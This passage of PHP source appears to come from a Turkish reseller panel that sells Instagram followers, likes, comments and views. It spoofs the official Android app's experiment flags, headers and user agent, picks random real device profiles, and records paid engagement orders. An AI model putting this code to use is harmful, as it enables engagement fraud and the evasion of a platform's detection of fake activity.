user,ig_shopping_post_insights,ig_android_webrtc_streamid_salt_universe,ig_android_wellbeing_timeinapp_v1_universe,ig_android_profile_cta_v3,ig_android_video_qp_logger_universe,ig_android_cache_video_autoplay_checker,ig_android_live_suggested_live_expansion,ig_android_vc_start_from_direct_inbox_universe,ig_perf_android_holdout,ig_fb_graph_differentiation_only_fb_candidates,ig_android_expired_build_lockout,ig_promote_lotus_universe,ig_android_video_streaming_upload_universe,ig_android_optic_fast_preview_restart_listener,ig_interactions_h1_2019_team_holdout_universe,ig_android_ad_async_ads_universe,ig_camera_android_effect_info_bottom_sheet_universe,ig_android_stories_feedback_badging_universe,ig_android_sorting_on_self_following_universe,ig_android_edit_location_page_info,ig_promote_are_you_sure_universe,ig_android_interactions_feed_label_below_comments_refactor_universe,ig_android_camera_platform_effect_share_universe,ig_stories_engagement_swipe_animation_simple_universe,ig_login_activity,ig_android_direct_quick_replies,ig_android_fbns_optimization_universe,ig_android_stories_alignment_guides_universe,ig_android_rn_ads_manager_universe,ig_explore_2018_post_chaining_account_recs_dedupe_universe,ig_android_click_to_direct_story_reaction_universe,ig_internal_research_settings,ig_android_stories_video_seeking_audio_bug_fix,ig_android_insights_holdout,ig_android_swipe_up_area_universe,ig_android_rendering_controls,ig_android_feed_post_sticker,ig_android_inline_editing_local_prefill,ig_android_hybrid_bitmap_v3_prenougat,ig_android_cronet_stack,ig_android_enable_igrtc_module,ig_android_scroll_audio_priority,ig_android_shopping_product_appeals_universe,ig_android_fb_follow_server_linkage_universe,ig_android_fblocation_universe,ig_android_direct_updated_story_reference_ui,ig_camera_holdout_h1_2018_product,live_with_request_to_join_button_universe,ig_android_music_continuous_capture,ig_android_churned_find_friends_redirect_to_discover_people,ig_android_main_feed_new_posts_indicator_universe,ig_vp9_hd_blacklist,ig_ios_queue_time_qpl_universe,ig_android_split_contacts_list,ig_android_connect_owned_page_universe,ig_android_felix_prefetch_thumbnail_sprite_sheet,ig_android_multi_dex_class_loader_v2,ig_android_watch_and_more_redesign,igtv_feed_previews,ig_android_qp_batch_fetch_caching_enabled_v1_universe,ig_android_profile_edit_phone_universe,ig_android_vc_renderer_type_universe,ig_android_local_2018_h2_holdout,ig_android_purx_native_checkout_universe,ig_android_vc_disable_lock_screen_content_access_universe,ig_android_business_transaction_in_stories_creator,android_cameracore_ard_ig_integration,ig_video_experimental_encoding_consumption_universe,ig_android_iab_autofill,ig_android_location_page_intent_survey,ig_camera_android_segmentation_qe2_universe,ig_android_image_mem_cache_strong_ref_universe,ig_android_business_promote_refresh_fb_access_token_universe,ig_android_stories_samsung_sharing_integration,ig_android_hashtag_header_display,ig_discovery_holdout_2019_h1_universe,ig_android_user_url_deeplink_fbpage_endpoint,ig_android_direct_mutation_manager_handler_thread_universe,ig_branded_content_show_settings_universe,ig_android_ad_holdout_watchandmore_universe,ig_android_direct_thread_green_dot_presence_universe,ig_android_camera_new_post_smile_universe,ig_android_shopping_signup_redesign_universe,ig_android_vc_missed_call_notification_action_reply,allow_publish_page_universe,ig_android_experimental_onetap_dialogs_universe,ig_promote_ppe_v2_universe,android_cameracore_ig_gl_oom_fixes_universe,ig_android_multi_capture_camera,ig_android_fb_family_navigation_badging_user,ig_android_follow_requests_copy_improvements,ig_media_geo_gating,ig_android_comments_notifications_universe,ig_android_render_output_surface_timeout_universe,ig_android_drop_frame_check_paused,ig_direct_raven_sharesheet_ranking,ig_android_realtime_mqtt_logging,ig_family_bridges_holdout_universe,ig_android_rainbow_hashtags,ig_android_ad_watchinstall_universe,ig_android_ad_account_top_followers_universe,ig_android_betamap_universe,ig_android_video_ssim_report_universe,ig_android_cache_network_util,ig_android_leak_detector_upload_universe,ig_android_carousel_prefetch_bumping,ig_fbns_preload_default,ig_android_inline_appeal_show_new_content,ig_fbns_kill_switch,ig_hashtag_following_holdout_universe,ig_android_show_weekly_ci_upsell_limit,ig_android_direct_reel_options_entry_point_2_universe,enable_creator_account_conversion_v0_animation,ig_android_http_service_same_thread,ig_camera_holdout_h1_2018_performance,ig_android_direct_mutation_manager_cancel_fix_universe,ig_music_dash,ig_android_fb_url_universe,ig_android_reel_raven_video_segmented_upload_universe,ig_android_promote_native_migration_universe,ig_camera_android_badge_face_effects_universe,ig_android_hybrid_bitmap_v3_nougat,ig_android_multi_author_story_reshare_universe,ig_android_vc_camera_zoom_universe,ig_android_enable_request_compression_ccu,ig_android_video_controls_universe,ig_android_logging_metric_universe_v2,ig_android_xposting_newly_fbc_people,ig_android_visualcomposer_inapp_notification_universe,ig_android_contact_point_upload_rate_limit_killswitch,ig_android_webrtc_encoder_factory_universe,ig_android_search_impression_logging,ig_android_handle_username_in_media_urls_universe,ig_android_sso_kototoro_app_universe,ig_android_mi_holdout_h1_2019,ig_android_igtv_autoplay_on_prepare,ig_file_based_session_handler_2_universe,ig_branded_content_tagging_upsell,ig_shopping_insights_parity_universe_android,ig_android_live_ama_universe,ig_android_external_gallery_import_affordance,ig_android_updatelistview_on_loadmore,ig_android_optic_new_zoom_controller,ig_android_hide_type_mode_camera_button,ig_android_photos_qpl,ig_android_reel_impresssion_cache_key_qe_universe,ig_android_show_profile_picture_upsell_in_reel_universe,ig_android_live_viewer_tap_to_hide_chrome_universe,ig_discovery_holdout_universe,ig_android_direct_import_google_photos2,ig_android_stories_tray_in_viewer,ig_android_request_verification_badge,ig_android_direct_unlimited_raven_replays_inthreadsession_fix,ig_android_netgo_cta,ig_android_viewpoint_netego_universe,ig_android_stories_separate_overlay_creation,ig_android_iris_improvements,ig_android_biz_conversion_naming_test,ig_android_fci_empty_feed_friend_search,ig_android_hashtag_page_support_places_tab,ig_camera_android_ar_platform_universe,ig_android_stories_viewer_prefetch_improvements,ig_android_optic_camera_warmup,ig_android_place_search_profile_image,ig_android_interactions_in_feed_comment_view_universe,ig_android_fb_sharing_shortcut,ig_android_oreo_hardware_bitmap,ig_android_analytics_diagnostics_universe,ig_android_insights_creative_tutorials_universe,ig_android_vc_universe,ig_android_profile_unified_follow_view,ig_android_collect_os_usage_events_universe,ig_android_shopping_nux_timing_universe,ig_android_fbpage_on_profile_side_tray,ig_android_native_logcat_interceptor,ig_android_direct_thread_content_picker,ig_android_notif_improvement_universe,ig_face_effect_ranking,ig_android_shopping_more_from_business,ig_feed_content_universe,ig_android_hacked_account_reporting,ig_android_disk_usage_logging_universe,ig_android_ad_redesign_iab_universe,ig_android_banyan_migration,ig_android_profile_event_leak_holdout,ig_android_stories_loading_automatic_retry,ig_android_gqls_typing_indicator,ag_family_bridges_2018_h2_holdout,ig_promote_net_promoter_score_universe,ig_android_direct_last_seen_message_indicator,ig_android_biz_conversion_suggest_biz_nux,ig_android_log_mediacodec_info,ig_android_vc_participant_state_callee_universe,ig_camera_android_boomerang_attribution_universe,ig_android_stories_weblink_creation,ig_android_horizontal_swipe_lfd_logging,ig_profile_company_holdout_h2_2018,ig_android_ads_manager_pause_resume_ads_universe,ig_promote_fix_expired_fb_accesstoken_android_universe,ig_android_stories_media_seen_batching_universe,ig_android_interactions_nav_to_permalink_followup_universe,ig_android_live_titles_viewer_side_view_title_universe,ig_android_direct_mark_as_read_notif_action,ig_android_edit_highlight_redesign,ig_android_direct_mutation_manager_backoff_universe,ig_android_interactions_comment_like_for_all_feed_universe,ig_android_mi_skip_analytic_event_pool_universe,ig_android_fbc_upsell_on_dp_first_load,ig_android_audio_ingestion_params,ig_android_video_call_participant_state_caller_universe,ig_fbns_shared,ig_feed_engagement_holdout_2018_h1,ig_camera_android_bg_processor,ig_android_optic_new_features_implementation,ig_android_stories_reel_interactive_tap_target_size,ig_android_video_live_trace_universe,ig_android_igtv_browse_with_pip_v2,ig_android_interactive_listview_during_refresh,ig_android_igtv_feed_banner_universe,ig_android_unfollow_from_main_feed_v2,ig_android_self_story_setting_option_in_menu,ig_android_ad_watchlead_universe,ufi_share,ig_android_live_special_codec_size_list,ig_android_live_qa_broadcaster_v1_universe,ig_android_hide_stories_viewer_list_universe,ig_android_direct_albums,ig_android_business_transaction_in_stories_consumer,ig_android_scroll_stories_tray_to_front_when_stories_ready,ig_android_direct_thread_composer,instagram_android_stories_sticker_tray_redesign,ig_camera_android_superzoom_icon_position_universe,ig_android_business_cross_post_with_biz_id_infra,ig_android_photo_invites,ig_android_reel_tray_item_impression_logging_viewpoint,ig_account_identity_2018_h2_lockdown_phone_global_holdout,ig_android_high_res_gif_stickers,ig_close_friends_v4,ig_fb_cross_posting_sender_side_holdout,ig_android_ads_history_universe,ig_android_comments_composer_newline_universe,ig_rtc_use_dtls_srtp,ig_promote_media_picker_universe,ig_android_live_start_live_button_universe,ig_android_vc_ongoing_call_notification_universe,ig_android_rate_limit_feed_item_viewable_helper,ig_android_bitmap_attribution_check,ig_android_ig_to_fb_sync_universe,ig_android_reel_viewer_data_buffer_size,ig_two_fac_totp_enable,ig_android_vc_missed_call_notification_action_call_back,ig_android_stories_landscape_mode,ig_android_ad_view_ads_native_universe,ig_android_igtv_whitelisted_for_web,ig_android_global_prefetch_scheduler,ig_android_live_thread_delay_for_mute_universe,ig_close_friends_v4_global,ig_android_share_publish_page_universe,ig_android_new_camera_design_universe,ig_direct_max_participants,ig_promote_hide_local_awareness_universe,ig_android_graphql_survey_new_proxy_universe,ig_android_fs_creation_flow_tweaks,ig_android_ad_watchbrowse_cta_universe,ig_android_camera_new_tray_behavior_universe,ig_android_direct_expiring_media_loading_errors,ig_android_show_fbunlink_button_based_on_server_data,ig_android_downloadable_vp8_module,ig_android_igtv_feed_trailer,ig_android_fb_profile_integration_universe,ig_android_profile_private_banner,ig_camera_android_focus_attribution_universe,ig_android_rage_shake_whitelist,ig_android_su_follow_back,ig_android_prefetch_notification_data,ig_android_webrtc_icerestart_on_failure_universe,ig_android_vpvd_impressions_universe,ig_android_payload_based_scheduling,ig_android_grid_cell_count,ig_android_new_highlight_button_text,ig_android_direct_search_bar_redesign,ig_android_hashtag_row_preparer,ig_android_ad_pbia_header_click_universe,ig_android_direct_visual_viewer_ppr_fix,ig_background_prefetch,ig_camera_android_focus_in_post_universe,ig_android_time_spent_dashboard,ig_android_direct_vm_activity_sheet,ig_promote_political_ads_universe,ig_android_stories_auto_retry_reels_media_and_segments,ig_android_recommend_accounts_killswitch,ig_shopping_video_half_sheet,ig_android_ad_iab_qpl_kill_switch_universe,ig_android_interactions_direct_share_comment_universe,ig_android_vc_sounds_universe,ig_camera_android_cache_format_picker_children,ig_android_post_live_expanded_comments_view_universe,ig_android_always_use_server_recents,ig_android_qp_slot_cooldown_enabled_universe,ig_android_asset_picker_improvements,ig_android_direct_activator_cards,ig_android_pending_media_manager_init_fix_universe,ig_android_facebook_global_state_sync_frequency_universe,ig_android_network_trace_migration,ig_android_creation_new_post_title,ig_android_reverse_audio,ig_android_camera_gallery_upload_we_universe,ig_android_direct_inbox_async_diffing_universe,ig_android_live_save_to_camera_roll_limit_by_screen_size_universe,ig_android_profile_phone_autoconfirm_universe,ig_direct_stories_questions,ig_android_optic_surface_texture_cleanup,ig_android_vc_use_timestamp_normalizer,ig_android_post_recs_show_more_button_universe,ig_shopping_checkout_mvp_experiment,ig_android_direct_pending_media,ig_android_scroll_main_feed,ig_android_intialization_chunk_410,ig_android_story_ads_default_long_video_duration,ig_android_interactions_mention_search_presence_dot_universe,ig_android_stories_music_sticker_position,ig_android_direct_character_limit,ig_stories_music_themes,ig_android_nametag_save_experiment_universe,ig_android_media_rows_prepare_10_31,ig_android_fs_new_gallery,ig_android_stories_hide_retry_button_during_loading_launch,ig_android_remove_follow_all_fb_list,ig_android_biz_conversion_editable_profile_review_universe,ig_android_shopping_checkout_mvp,ig_android_local_info_page,ig_android_direct_log_badge_count';
	const LOGIN_EXPERIMENTS = 'ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_autosubmit_password_recovery_universe,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_background_voice_phone_confirmation_prefilled_phone_number_only,ig_android_login_identifier_fuzzy_match,ig_android_one_tap_aymh_redesign_universe,ig_android_keyboard_detector_fix,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_aymh_signal_collecting_kill_switch,ig_android_login_forgot_password_universe,ig_android_smartlock_hints_universe,ig_android_smart_prefill_killswitch,ig_android_account_switch_infra_universe,ig_android_multi_tap_login_new,ig_android_email_one_tap_auto_login_during_reg,ig_android_category_search_in_sign_up,ig_android_report_nux_completed_device,ig_android_reg_login_profile_photo_universe,ig_android_caption_typeahead_fix_on_o_universe,ig_android_nux_add_email_device,ig_android_ci_opt_in_placement,ig_android_remember_password_at_login,ig_type_ahead_recover_account,ig_android_analytics_accessibility_event,ig_sem_resurrection_logging,ig_android_abandoned_reg_flow,ig_android_editable_username_in_reg,ig_android_account_recovery_auto_login,ig_android_sim_info_upload,ig_android_skip_signup_from_one_tap_if_no_fb_sso,ig_android_hide_fb_flow_in_add_account_flow,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_prioritize_user_input_on_switch_to_signup,ig_android_gmail_oauth_in_reg,ig_android_login_safetynet,ig_android_gmail_autocomplete_account_over_one_tap,ig_android_background_voice_phone_confirmation,ig_android_phone_auto_login_during_reg,ig_android_hide_typeahead_for_logged_users,ig_android_hindi,ig_android_reg_modularization_universe,ig_android_bottom_sheet,ig_android_snack_bar_hiding,ig_android_one_tap_fallback_auto_login,ig_android_device_verification_separate_endpoint,ig_account_recovery_with_code_android_universe,ig_android_onboarding_skip_fb_connect,ig_android_phone_reg_redesign_universe,ig_android_universe_noticiation_channels,ig_android_media_cache_cleared_universe,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_dialog_email_reg_error_universe,ig_android_ci_fb_reg,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_suma_biz_account,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_android_display_full_country_name_in_reg_universe,ig_android_exoplayer_settings,ig_android_persistent_duplicate_notif_checker,ig_android_security_intent_switchoff,ig_android_background_voice_confirmation_block_argentinian_numbers,ig_android_do_not_show_back_button_in_nux_user_list,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_icon_perf2,ig_android_email_suggestions_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_prefill_full_name_from_fb,ig_android_access_flow_prefill';
	const LAUNCHER_CONFIGS = 'ig_android_felix_release_players,ig_user_mismatch_soft_error,ig_android_os_version_blocking_config,ig_android_carrier_signals_killswitch,fizz_ig_android,ig_mi_block_expired_events,ig_android_killswitch_perm_direct_ssim,ig_fbns_blocked';
	const SIG_KEY_VERSION = '4';
	// User-Agent Constants.
	const USER_AGENT_LOCALE = 'en_US'; // "language_COUNTRY".
	// HTTP Protocol Constants.
	const ACCEPT_LANGUAGE = 'en-US'; // "language-COUNTRY".
	const ACCEPT_ENCODING = 'gzip,deflate';
	const CONTENT_TYPE = 'application/x-www-form-urlencoded; charset=UTF-8';
	const X_FB_HTTP_Engine = 'Liger';
	const X_IG_Connection_Type = 'WIFI';
	const X_IG_Capabilities = '3brTvw==';

	// Supported Capabilities
	const SUPPORTED_CAPABILITIES = [
		[
			'name'    => 'SUPPORTED_SDK_VERSIONS',
			'value'   => '13.0,14.0,15.0,16.0,17.0,18.0,19.0,20.0,21.0,22.0,23.0,24.0,25.0,26.0,27.0,28.0,29.0,30.0,31.0,32.0,33.0,34.0,35.0,36.0,37.0,38.0,39.0,40.0,41.0,42.0,43.0,44.0,45.0,46.0,47.0,48.0,49.0,50.0,51.0,52.0,53.0',
		],
		[
			'name'  => 'FACE_TRACKER_VERSION',
			'value' => '12',
		],
		[
			'name'  => 'segmentation',
			'value' => 'segmentation_enabled',
		],
		[
			'name'  => 'WORLD_TRACKER',
			'value' => 'WORLD_TRACKER_ENABLED',
		],
	];
	// Facebook Constants.
	const FACEBOOK_OTA_FIELDS = 'update%7Bdownload_uri%2Cdownload_uri_delta_base%2Cversion_code_delta_base%2Cdownload_uri_delta%2Cfallback_to_full_update%2Cfile_size_delta%2Cversion_code%2Cpublished_date%2Cfile_size%2Cota_bundle_type%2Cresources_checksum%7D';
	const FACEBOOK_ORCA_PROTOCOL_VERSION = 20150314;
	const FACEBOOK_ORCA_APPLICATION_ID = '124024574287414';
	const FACEBOOK_ANALYTICS_APPLICATION_ID = '567067343352427';
	// MQTT Constants.
	const PLATFORM = 'android';
	const FBNS_APPLICATION_NAME = 'MQTT';
	const INSTAGRAM_APPLICATION_NAME = 'Instagram';
	const PACKAGE_NAME = 'com.instagram.android';
	// Instagram Quick Promotions.
	const SURFACE_PARAM = 4715;
	const WEB_URL = 'https://www.instagram.com/';

	// Internal Feedtype Constants. CRITICAL: EVERY value here MUST be unique!
	const FEED_TIMELINE = 1;
	const FEED_TIMELINE_ALBUM = 2;
	const FEED_STORY = 3;
	const FEED_DIRECT = 4;
	const FEED_DIRECT_STORY = 5;
	const FEED_TV = 6;
}

class GoodDevices
{
	const DEVICES = [
		"25/7.1.1; 440dpi; 1080x1920; Xiaomi; Mi Note 3; jason; qcom",
		"23/6.0.1; 480dpi; 1080x1920; Xiaomi; Redmi Note 3; kenzo; qcom",
		"23/6.0; 480dpi; 1080x1920; Xiaomi; Redmi Note 4; nikel; mt6797",
		"24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom",
		"23/6.0; 480dpi; 1080x1920; Xiaomi; Redmi Note 4X; nikel; mt6797",
		"27/8.1.0; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi Note 5; whyred; qcom",
		"23/6.0.1; 480dpi; 1080x1920; Xiaomi; Redmi 4; markw; qcom",
		"27/8.1.0; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi 5 Plus; vince; qcom",
		"25/7.1.2; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi 5 Plus; vince; qcom",
		"26/8.0.0; 480dpi; 1080x1920; Xiaomi; MI 5; gemini; qcom",
		"27/8.1.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Mi A1; tissot_sprout; qcom",
		"26/8.0.0; 480dpi; 1080x1920; Xiaomi; MI 6; sagit; qcom",
		"25/7.1.1; 440dpi; 1080x1920; Xiaomi; MI MAX 2; oxygen; qcom",
		"24/7.0; 480dpi; 1080x1920; Xiaomi; MI 5s; capricorn; qcom",
		"26/8.0.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880",
		"26/8.0.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895",
		"26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895",
		"26/8.0.0; 420dpi; 1080x2094; samsung; SM-G955F; dream2lte; samsungexynos8895",
		"26/8.0.0; 560dpi; 1440x2792; samsung; SM-G955F; dream2lte; samsungexynos8895",
		"24/7.0; 480dpi; 1080x1920; samsung; SM-A510F; a5xelte; samsungexynos7580",
		"26/8.0.0; 480dpi; 1080x1920; samsung; SM-G930F; herolte; samsungexynos8890",
		"26/8.0.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890",
		"26/8.0.0; 420dpi; 1080x2094; samsung; SM-G965F; star2lte; samsungexynos9810",
		"26/8.0.0; 480dpi; 1080x2076; samsung; SM-A530F; jackpotlte; samsungexynos7885",
		"24/7.0; 640dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420",
		"26/8.0.0; 420dpi; 1080x1920; samsung; SM-A720F; a7y17lte; samsungexynos7880",
		"24/7.0; 640dpi; 1440x2560; samsung; SM-G920F; zeroflte; samsungexynos7420",
		"24/7.0; 420dpi; 1080x1920; samsung; SM-J730FM; j7y17lte; samsungexynos7870",
		"26/8.0.0; 480dpi; 1080x2076; samsung; SM-G960F; starlte; samsungexynos9810",
		"26/8.0.0; 420dpi; 1080x2094; samsung; SM-N950F; greatlte; samsungexynos8895",
		"26/8.0.0; 420dpi; 1080x2094; samsung; SM-A730F; jackpot2lte; samsungexynos7885",
		"26/8.0.0; 420dpi; 1080x2094; samsung; SM-A605FN; a6plte; qcom",
		"26/8.0.0; 480dpi; 1080x1920; HUAWEI/HONOR; STF-L09; HWSTF; hi3660",
		"27/8.1.0; 480dpi; 1080x2280; HUAWEI/HONOR; COL-L29; HWCOL; kirin970",
		"26/8.0.0; 480dpi; 1080x2032; HUAWEI/HONOR; LLD-L31; HWLLD-H; hi6250",
		"26/8.0.0; 480dpi; 1080x2150; HUAWEI; ANE-LX1; HWANE; hi6250",
		"26/8.0.0; 480dpi; 1080x2032; HUAWEI; FIG-LX1; HWFIG-H; hi6250",
		"27/8.1.0; 480dpi; 1080x2150; HUAWEI/HONOR; COL-L29; HWCOL; kirin970",
		"26/8.0.0; 480dpi; 1080x2038; HUAWEI/HONOR; BND-L21; HWBND-H; hi6250",
		"23/6.0.1; 420dpi; 1080x1920; LeMobile/LeEco; Le X527; le_s2_ww; qcom"
	];

	public static function getRandomGoodDevice()
	{
		$randomIdx = array_rand(self::DEVICES, 1);

		return self::DEVICES[$randomIdx];
	}
}

class Device
{
	const REQUIRED_ANDROID_VERSION = '2.2';

	protected $_appVersion;
	protected $_userLocale;
	protected $_deviceString;
	protected $_userAgent;
	protected $_androidVersion;
	protected $_androidRelease;
	protected $_dpi;
	protected $_resolution;
	protected $_manufacturer;
	protected $_brand;
	protected $_model;
	protected $_device;
	protected $_cpu;

	public function __construct($appVersion, $userLocale, $deviceString = NULL, $autoFallback = true)
	{
		$this->_appVersion = $appVersion;
		$this->_userLocale = $userLocale;
		if ($autoFallback && !is_string($deviceString)) {
			$deviceString = GoodDevices::getRandomGoodDevice();
		}

		$this->_initFromDeviceString($deviceString);
	}

	protected function _initFromDeviceString($deviceString)
	{
		if (!is_string($deviceString) || empty($deviceString)) {
			throw new RuntimeException('Device string is empty.');
		}

		$parts = explode('; ', $deviceString);

		if (count($parts) !== 7) {
			throw new RuntimeException(sprintf('Device string "%s" does not conform to the required device format.', $deviceString));
		}

		$androidOS = explode('/', $parts[0], 2);

		if (version_compare($androidOS[1], '2.2', '<')) {
			throw new RuntimeException(sprintf('Device string "%s" does not meet the minimum required Android version "%s" for Instagram.', $deviceString, '2.2'));
		}

		$manufacturerAndBrand = explode('/', $parts[3], 2);
		$this->_deviceString = $deviceString;
		$this->_androidVersion = $androidOS[0];
		$this->_androidRelease = $androidOS[1];
		$this->_dpi = $parts[1];
		$this->_resolution = $parts[2];
		$this->_manufacturer = $manufacturerAndBrand[0];
		$this->_brand = (isset($manufacturerAndBrand[1]) ? $manufacturerAndBrand[1] : NULL);
		$this->_model = $parts[4];
		$this->_device = $parts[5];
		$this->_cpu = $parts[6];
		$this->_userAgent = UserAgent::buildUserAgent($this->_appVersion, $this->_userLocale, $this);
	}

	public function getDeviceString()
	{
		return $this->_deviceString;
	}

	public function getUserAgent()
	{
		return $this->_userAgent;
	}

	public function getAndroidVersion()
	{
		return $this->_androidVersion;
	}

	public function getAndroidRelease()
	{
		return $this->_androidRelease;
	}

	public function getDPI()
	{
		return $this->_dpi;
	}

	public function getResolution()
	{
		return $this->_resolution;
	}

	public function getManufacturer()
	{
		return $this->_manufacturer;
	}

	public function getBrand()
	{
		return $this->_brand;
	}

	public function getModel()
	{
		return $this->_model;
	}

	public function getDevice()
	{
		return $this->_device;
	}

	public function getCPU()
	{
		return $this->_cpu;
	}
}

class UserAgent
{
	const USER_AGENT_FORMAT = 'Instagram %s Android (%s/%s; %s; %s; %s; %s; %s; %s; %s; %s)';

	static public function buildUserAgent($appVersion, $userLocale, Device $device)
	{
		$manufacturerWithBrand = $device->getManufacturer();

		if ($device->getBrand() !== NULL) {
			$manufacturerWithBrand .= '/' . $device->getBrand();
		}

		return sprintf('Instagram %s Android (%s/%s; %s; %s; %s; %s; %s; %s; %s; %s)', $appVersion, $device->getAndroidVersion(), $device->getAndroidRelease(), $device->getDPI(), $device->getResolution(), $manufacturerWithBrand, $device->getModel(), $device->getDevice(), $device->getCPU(), $userLocale, '208061712');
	}
}

class ApiService
{
	private $db;
	private $data;

	public function __construct()
	{
	}

	public function addData($data)
	{
		$this->data = $data;
		$this->db = \Wow\Database\Database::getInstance();

		if ($this->data['islemTip'] == 'follow') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,userID,userName,imageUrl,krediTotal,krediLeft,excludedInstaIDs,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:userID,:userName,:imageUrl,:krediTotal,:krediLeft,:excludedInstaIDs,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'excludedInstaIDs' => $this->data['excludedInstaIDs'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'like') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,mediaID,mediaCode,userID,userName,imageUrl,krediTotal,krediLeft, excludedInstaIDs,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:mediaID,:mediaCode,:userID,:userName,:imageUrl,:krediTotal,:krediLeft, :excludedInstaIDs,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'mediaID' => $this->data['mediaID'], 'mediaCode' => $this->data['mediaCode'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'excludedInstaIDs' => $this->data['excludedInstaIDs'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'comment') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,mediaID,mediaCode,userID,userName,imageUrl,krediTotal,krediLeft, excludedInstaIDs,allComments,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:mediaID,:mediaCode,:userID,:userName,:imageUrl,:krediTotal,:krediLeft, :excludedInstaIDs,:allComments,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'mediaID' => $this->data['mediaID'], 'mediaCode' => $this->data['mediaCode'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'excludedInstaIDs' => $this->data['excludedInstaIDs'], 'allComments' => $this->data['comments'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'story') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,userID,userName,imageUrl,krediTotal,krediLeft,allStories,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:userID,:userName,:imageUrl,:krediTotal,:krediLeft,:allStories,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'allStories' => $this->data['allStories'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'videoview') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,mediaID,mediaCode,userID,userName,imageUrl,krediTotal,krediLeft,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:mediaID,:mediaCode,:userID,:userName,:imageUrl,:krediTotal,:krediLeft,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'mediaID' => $this->data['mediaID'], 'mediaCode' => $this->data['mediaCode'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'save') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,mediaID,mediaCode,userID,userName,imageUrl,krediTotal,krediLeft,start_count,talepPrice,isApi) VALUES(:bayiID,:islemTip,:mediaID,:mediaCode,:userID,:userName,:imageUrl,:krediTotal,:krediLeft,:start_count,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'mediaID' => $this->data['mediaID'], 'mediaCode' => $this->data['mediaCode'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'imageUrl' => $this->data['imageUrl'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'start_count' => $this->data['start_count'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'commentlike') {
